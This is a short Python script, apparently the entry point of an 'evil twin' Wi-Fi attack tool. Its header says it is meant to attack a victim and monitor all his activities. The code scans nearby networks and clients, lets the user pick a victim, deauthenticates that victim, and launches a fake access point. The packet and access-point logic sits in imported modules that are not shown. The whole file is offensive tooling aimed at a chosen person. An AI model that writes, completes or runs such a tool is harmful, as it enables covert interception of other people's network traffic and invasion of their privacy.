# attack victim and monitor all his activities

# sudo python3 attack.py

# detect
"""
1. turn on monitor mode
2. scan
3. display all the WI-FI
4. let the user choose one WI-FI
5. display choosen WI-FI users
6. let the user choose one victim
"""
# attack
"""
1. Disconnect the victim from WI-FI (using deauthentication)
2. Disconnect the WI-FI from victim (using deauthentication)
...
*. create fake WI-FI.
...
*. display victim's activities 
"""
# finish
"""
1. turn off monitor mode
"""

from fake import Fake
from network import Network


def start_attack():
    print('start EVIL TWIN attack...')
    # if os.geteuid():
    #     sys.exit('need sudo permission')

    net_obj = Network()
    interface = net_obj.get_interface()
    if interface == 'None':
        return -1
    # scanning for networks
    net_mac = net_obj.scanning_networks()
    if net_mac == 'None':
        return -1
    # scanning for clients 
    cli_mac = net_obj.scanning_clients()
    if cli_mac == 'None':
        return -1

    fake_obj = Fake(interface, net_mac, cli_mac)
    # deauthentication
    fake_obj.deauthentication_packet()
    # fake_ap
    fake_obj.fake_ap()

    net_obj.off()
    print('done')


if __name__ == '__main__':
    start_attack()